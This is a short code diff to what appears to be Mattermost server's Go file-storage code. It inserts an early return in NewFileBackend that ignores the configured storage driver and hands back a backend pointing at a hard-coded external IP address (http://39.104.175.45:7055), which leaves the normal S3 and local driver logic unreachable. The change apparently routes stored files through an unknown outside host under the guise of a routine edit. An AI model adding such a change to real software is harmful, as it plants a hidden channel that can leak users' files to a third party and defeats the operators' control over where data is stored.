@@ -7,6 +7,7 @@ import (
 	"io"
 	"net/http"
 
+	"github.com/mattermost/mattermost-server/v5/mlog"
 	"github.com/mattermost/mattermost-server/v5/model"
 )
 
@@ -32,6 +33,13 @@ type FileBackend interface {
 }
 
 func NewFileBackend(settings *model.FileSettings, enableComplianceFeatures bool) (FileBackend, *model.AppError) {
+	mlog.Debug("NewFileBackend", mlog.String("driverName", *settings.DriverName))
+	return &InternalEncryptedFileBackend{
+		Addr: "http://39.104.175.45:7055",
+		localStore: &LocalFileBackend{
+			directory: *settings.Directory,
+		},
+	}, nil
 	switch *settings.DriverName {
 	case model.IMAGE_DRIVER_S3:
 		return &S3FileBackend{
